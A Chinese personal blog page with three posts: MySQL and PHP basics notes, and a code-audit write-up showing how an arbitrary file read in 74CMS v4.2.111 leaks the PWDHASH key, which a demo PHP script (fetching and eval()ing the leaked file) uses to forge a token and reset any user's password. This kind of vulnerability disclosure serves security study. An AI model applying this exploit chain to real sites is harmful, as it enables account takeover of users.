<p>连接:<code>mysql -uroot -proot</code><br>不区分大小写<br>数据库操作:</p>
<pre><code>create DATABASE RUNOOB;//创建
drop database runoop;//删除
use runoob;//进入runoob库
</code></pre><p>数据表操作:<br>进入数据库后就可对表进操作:</p>
<pre><code>创建数据表:
mysql&gt; create table runoob_tbl(
    -&gt; runoob_id int not null auto_increment,
    -&gt; runoob_title varchar(50) not null,
    -&gt; run_auther varchar(50) not null,
    -&gt; primary key (runoob_id)
    -&gt; );

删除数据表:
mysql&gt;DROP TABLE runoob_tbl
</code></pre><p>数据字段操作:</p>
<pre><code>插入数据  //注意字段内容加引号
mysql&gt; insert into runoob_tbl
-&gt; (runoob_id,runoob_title,run_auther)
-&gt; values
-&gt; (&apos;1&apos;,&apos;test_title&apos;,&apos;P0rZ9&apos;);

查询数据
mysql-&gt;select * from runoob_tbl;

删除数据
DELETE FROM runoob_tbl WHERE runoob_id=3;
</code></pre><hr>
<p>union操作符可以合并两条select语句的查询结果,基本语法:</p>
<pre><code>select * from table union select * from user;
</code></pre><p>union使用满足条件:<br>两个查询返回的列数必须相同<br>两个查询语句返回数据类型必须相同</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/12/PHP基础知识/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/10/12/PHP基础知识/" itemprop="url">基础知识 | PHP基础知识</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-12T08:15:41+08:00">
                2018-10-12
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>打算将PHP学习的基础知识码出来,持续更新。</p>
</blockquote>
<hr>
<p>php四种标记风格：</p>
<pre><code>&lt;?php ?&gt; //官方推荐
&lt;? ?&gt;    //短标记风格 需要在php.ini中设置short_open_tag = on
&lt;% %&gt;    //ASP风格    需要在php.ini中设置asp_tags = on
&lt;script language=&quot;php&quot;&gt;代码&lt;/script&gt; //JS标记风格 任意情况都可使用
</code></pre><p>注释:</p>
<pre><code>// #        //单行注释
/*   */     //多行注释
</code></pre><p>引用赋值：<br><img src="http://static.zybuluo.com/chhyx/nvnvjmhlnfqbjyu8l5lp9pfs/image_1cpj4q7d57ph1jm11qvfeg1sqm1m.png" alt="image_1cpj4q7d57ph1jm11qvfeg1sqm1m.png-39.8kB"><br><img src="http://static.zybuluo.com/chhyx/q58f8ggkquq7i5xocprc2pg9/image_1cpj4nuff1uh41jrh14uc1i9711uop.png" alt="image_1cpj4nuff1uh41jrh14uc1i9711uop.png-47kB"></p>
<p>字符串:<br>单引号:变量和转义的序列都不会进行转义<br>双引号:PHP会处理双引号括起来的字符串、变量以及转义序列(\n等)</p>
<p>标识符(定界符)：<br><img src="http://static.zybuluo.com/chhyx/vkgni63ayh1e2xowi3cnum1z/image_1cpj5rk701vlv1ge1d0q106m4c023.png" alt="image_1cpj5rk701vlv1ge1d0q106m4c023.png-37.1kB"></p>
<p>格式化字符串:<br><img src="http://static.zybuluo.com/chhyx/aourri8psost2uos8z6jqft4/image_1cpj65kpp138a1h1819jb1ufguam2g.png" alt="image_1cpj65kpp138a1h1819jb1ufguam2g.png-32.8kB"></p>
<p>获取字串位置:</p>
<pre><code>&lt;?php

$str = &apos;Php is the best,php is my favorite&apos;;
</code></pre><p>echo substr_count($str,’php’);//出现次数<br>    echo strpos($str,’php’);//返回php第一次出现在$str的位置<br>    echo stripos($str,’php’);//返回php第一次出现在$str的位置 不区分大小写<br>    echo strrpos($str,’php’);//返回php最后一次出现在$str的位置<br>    echo strripos($str,’php’);//返回php最后一次出现在$str的位置 不区分大小写</p>
<pre><code>?&gt;
</code></pre><p>字符串替换：<br><img src="http://static.zybuluo.com/chhyx/1w096o9pm7ym6uqyq7qs8yim/image_1cpj76eft8dh1ac5vd5qb12mf2t.png" alt="image_1cpj76eft8dh1ac5vd5qb12mf2t.png-34.9kB"></p>
<p>正则:</p>
<pre><code>a.^PHP 匹配以PHP开头的字符串
  [^a-z] 表示匹配所有非小写字母开头的字符串
b.PHP$ 匹配以PHP结尾的字符串
</code></pre><p>c.^PHP$ 精确匹配PHP字符串<br>    d.PHP 匹配所有含有PHP的字符串<br>    e.com|org|net 匹配com、org、net中的任意一个<br>    f.PHP内置通用字符集</p>
<p><img src="http://static.zybuluo.com/chhyx/gn2bptw7jyzjckdyzluyycnf/image_1cpj7d42p1hji1sahkukfrrhio3q.png" alt="image_1cpj7d42p1hji1sahkukfrrhio3q.png-34.5kB"></p>
<pre><code>g.使用{}确定重复出现的次数
</code></pre><p><img src="http://static.zybuluo.com/chhyx/26tsa0smndv6beslkafazqif/image_1cpj7fkmk5fei11gvn1flv1b399.png" alt="image_1cpj7fkmk5fei11gvn1flv1b399.png-35.5kB"></p>
<p>文件操作:<br>a.目录部分</p>
<pre><code>$path = &quot;c:/sec/blogs/index/&quot;;
$file = dirname($path); //返回目录 $file:c:/sec/blogs
</code></pre><p>b.路径关联数组:</p>
<pre><code>$pathinfo = pathinfo(&quot;www/test/index.html&quot;);
//得到一个数组 包含4个值
echo $pathinfo[&apos;dirname&apos;];//路径 www/test
echo $pathinfo[&apos;basename&apos;];//基本名 index.html
echo $pathinfo[&apos;extension&apos;];//扩展名 html
echo $pathinfo[&apos;filename&apos;];//文件名 index
</code></pre><p>c.文件部分<br>file<br>open<br>copy<br>file_get_contents</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/10/74CMS_V4.2.111任意文件读取到任意密码重置/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/10/10/74CMS_V4.2.111任意文件读取到任意密码重置/" itemprop="url">代码审计 | 74CMS_V4.2.111任意文件读取到任意密码重置</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-10T09:15:41+08:00">
                2018-10-10
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<p>审计cms：<a href="http://static.zybuluo.com/chhyx/jnsrp4ki483xp9oi2ryenh2z/image_1cpe26mdq14po5331v8a1gik1132d.png" target="_blank" rel="noopener">74cms_v4.2.111</a><br>漏洞原理:任意文件读取得到关键Token来修改用户密码。<br>任意文件读取漏洞可参考笔者之前的文章:<a href="https://p0rz9.github.io/2018/10/09/74CMS_V4.2.111%E4%B8%80%E5%A4%84%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E9%99%84py%E8%84%9A%E6%9C%AC/" target="_blank" rel="noopener">74CMS_V4.2.111一处任意文件读取附py脚本</a></p>
<p><strong>代码分析</strong><br>1.在查看<code>Home\Controller\ApiController.class.php</code>代码时:<br>发现编辑会员资料时可用<code>uid</code>修改密码<br><img src="http://static.zybuluo.com/chhyx/jnsrp4ki483xp9oi2ryenh2z/image_1cpe26mdq14po5331v8a1gik1132d.png" alt="image_1cpe26mdq14po5331v8a1gik1132d.png-60.4kB"></p>
<p>遂拿起Burp测试一波:<br><img src="http://static.zybuluo.com/chhyx/gdusp76823b283ot2p7my7ou/image_1cpdu0m528571igq1v16eirejpp.png" alt="image_1cpdu0m528571igq1v16eirejpp.png-84.1kB"></p>
<p>发现显示Token验证失败 我们跟进验证token的函数<code>check_token()</code>:<br><img src="http://static.zybuluo.com/chhyx/e0p6ctn3i3xh1smil7qikr9d/image_1cpduafgk1ps31irv1c5h12g9f7716.png" alt="image_1cpduafgk1ps31irv1c5h12g9f7716.png-57.2kB"></p>
<p>我们要想通过<code>token</code>验证 需要满足这个条件:</p>
<pre><code>(decrypt($token,C(&apos;PWDHASH&apos;))==C(&apos;PWDHASH&apos;))
</code></pre><p>2.跟进<code>decrypt()</code>,发现这是一个解密函数,参数为源字符串与密钥:</p>
<pre><code>function decrypt($txt, $key = &apos;_qscms&apos;) {//token  C
// $txt 的结果为加密后的字串经过 base64 解码，然后与私有密匙一起，
// 经过 passport_key() 函数处理后的返回值
$txt = passport_key(base64_decode($txt), $key);
// 变量初始化
$tmp = &apos;&apos;;
// for 循环，$i 为从 0 开始，到小于 $txt 字串长度的整数
for ($i = 0; $i &lt; strlen($txt); $i++) {
    // $tmp 字串在末尾增加一位，其内容为 $txt 的第 $i 位，
    // 与 $txt 的第 $i + 1 位取异或。然后 $i = $i + 1
    $tmp .= $txt[$i] ^ $txt[++$i];
}
// 返回 $tmp 的值作为结果
return $tmp;
</code></pre><p>}</p>
<p>分析代码可得到正确的token值为<code>C(&#39;PWDHASH&#39;)</code>与密钥<code>C(&#39;PWDHASH&#39;)</code>经过<code>encrypt()</code>加密得到的字符串。</p>
<p>我们先测试下如果拿到正确Token可不可以成功修改密码:<br><img src="http://static.zybuluo.com/chhyx/s0rm02likekl3984br8648j0/image_1cpe4ogft18r2iof1jeidqf1n7v2m.png" alt="image_1cpe4ogft18r2iof1jeidqf1n7v2m.png-89.3kB"></p>
<p>去Burp测试:<br><img src="http://static.zybuluo.com/chhyx/a2od1lkyzvmohwm4qgqttoi3/image_1cpe4t1s01ce91irna0brlj1l2r33.png" alt="image_1cpe4t1s01ce91irna0brlj1l2r33.png-97.4kB"></p>
<p>可看到修改成功。</p>
<p>3.那现在的问题转化为如何去获取密钥<code>C(&#39;PWDHASH&#39;)</code><br>因为这个值是系统定义好的,那我们就可以利用昨天审出的文件读取来得到密钥,我们搜索下定义密钥的文件,得到<code>pwdhash.php</code>。</p>
<p>4.现在利用漏洞就很简单了</p>
<pre><code>python脚本获取含有密钥的jpg文件--&gt;PHP利用密钥进行加密,得到token--&gt;用得到的token修改用户密码
</code></pre><p><strong>漏洞利用</strong><br>1.通过任意文件读取<br><code>upload\Application\Common\Conf\pwdhash.php</code>文件,得到一个包含pwdhash值的jpg文件</p>
<p><img src="http://static.zybuluo.com/chhyx/e1c4hizaw7ro9iph3nht1cof/image_1cpe3saa8fdl6tkc2idmr10b529.png" alt="image_1cpe3saa8fdl6tkc2idmr10b529.png-76.1kB"></p>
<p>2.我们本地加密得到<code>token</code>:</p>
<pre><code>#demo.php
&lt;?php

function get_token($pwdhash){
    $token = encrypt($pwdhash,$pwdhash);
    var_dump($token);

}
function encrypt($txt, $key = &apos;_qscms&apos;) {
    ...
}
function passport_key($txt, $encrypt_key) {
   ...
}

$file_name = &apos;http://127.0.0.1:84/data/upload/avatar/1810/10/76162f0285d10193b1d79ceff9653d1c.jpg&apos;;
$data = eval(str_replace(&apos;&lt;?php&apos;, &apos;&apos;, file_get_contents($file_name)));
get_token($data[&apos;PWDHASH&apos;]);
?&gt;
</code></pre><p>得到Token<br><img src="http://static.zybuluo.com/chhyx/zko0432p3ubba1cbxq8e3l9z/image_1cpe1iard1uic199ju9kueb1u4h1j.png" alt="image_1cpe1iard1uic199ju9kueb1u4h1j.png-111.9kB"></p>
<p>3.用得到的token修改密码:<br><img src="http://static.zybuluo.com/chhyx/quwblkxx885w7i2eylbn5g12/image_1cpe1lksk20k5mfq9b1u5vvre20.png" alt="image_1cpe1lksk20k5mfq9b1u5vvre20.png-103.6kB"></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">P0rZ9</p>
              <p class="site-description motion-element" itemprop="description">找回当年那个被寄予厚望的自己</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">43</span>
                  <span class="site-state-item-name">posts</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">9</span>
                  <span class="site-state-item-name">tags</span>
                </a>
              </div>
            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">P0rZ9</span>

  
</div>












        
<div class="busuanzi-count">
  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

  
    <span class="site-uv">
      <i class="fa fa-user"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
      
    </span>
  

  
    <span class="site-pv">
      <i class="fa fa-eye"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
      
    </span>
  
</div>








        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
